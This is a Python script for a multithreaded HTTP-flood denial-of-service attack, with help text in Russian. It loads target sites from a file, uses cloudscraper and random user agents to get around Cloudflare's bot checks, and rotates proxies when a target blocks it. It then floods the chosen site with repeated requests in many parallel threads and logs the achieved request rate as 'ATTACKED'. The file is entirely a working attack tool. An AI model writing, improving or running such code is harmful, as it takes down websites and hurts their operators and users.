import time
from os import system
from gc import collect
from random import choice
from time import sleep
from threading import Thread
from sys import stderr

from urllib3 import disable_warnings

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent

from config import MAX_REQUESTS, SYS_NAME, PROXY, DEFAULT_THREADS_COUNT

disable_warnings()

logger.remove()
logger.add(stderr,
           format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")


def load_sites_for_attack():
    sites = []
    with open('site_for_attack.txt', 'r') as f:
        for site in f.read().split('\n'):
            if site.startswith('http'):
                sites.append(site)
    return sites


sites_for_attack = load_sites_for_attack()


def site_attack(scraper, site: str, count_requests: int = MAX_REQUESTS):
    global success_response_count, start_time
    success_response_count += 1
    for _ in range(count_requests):
        response = scraper.get(site)
        success_response_count += 1
        message = f"ATTACKED {site}; " \
                  f"RESPONSE CODE: {response.status_code}; " \
                  f"SPEED: {int(success_response_count / (time.time() - start_time))} requests/s;"
        logger.success(message) if response.status_code < 303 else logger.info(message)
        response.close()


def main():
    try:
        while True:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}
            )
            scraper.headers.update(
                {
                    'Content-Type': 'application/json',
                    'cf-visitor': 'https',
                    'User-Agent': random_useragent(),
                    'Connection': 'keep-alive',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'ru',
                    'x-forwarded-proto': 'https',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            )
            site = choice(sites_for_attack)
            logger.info(f"STARTING ATTACK TO {site}")
            try:
                response = scraper.get(site)
                if response.status_code > 303:
                    for proxy in PROXY:
                        proxy_url = f'{proxy["ip"]}://{proxy["auth"]}'
                        scraper.proxies.update(
                            {
                                'http': proxy_url,
                                'https': proxy_url
                            }
                        )
                        response = scraper.get(site)
                        if response.status_code in range(200, 302):
                            site_attack(scraper, site)
                else:
                    site_attack(scraper, site)
            except Exception as ex:
                logger.error(f"{site}: {ex}")
            sleep(.005)
    finally:
        print("OK closed")


def clear_console(sys_name: str = SYS_NAME):
    if sys_name == 'posix':
        system('clear')
    else:
        system('cls')


def cleaner():
    while True:
        sleep(30)
        clear_console()
        collect()


if __name__ == '__main__':
    import click


    @click.command()
    @click.option('--threads_count', '-t', default=DEFAULT_THREADS_COUNT,
                  help='Количество запущенных потоков; Не импользуйте слишком большое чистло!', show_default=True)
    @click.option('--without_logger', '-wl', is_flag=True, help='Вкл/выкл логгирование;')
    def attack(threads_count, without_logger):
        global success_response_count, start_time
        clear_console()

        logger.info(f"Loggers is {'stopped' if without_logger else 'started'}.")
        logger.info(f"Running {threads_count} threads...")

        if without_logger:
            logger.stop()

        start_time = time.time()
        for _ in range(threads_count):
            Thread(target=main).start()

        Thread(target=cleaner, daemon=True).start()

        print("All threads was successfully started.\n")

    success_response_count = 0
    start_time = time.time()
    attack()
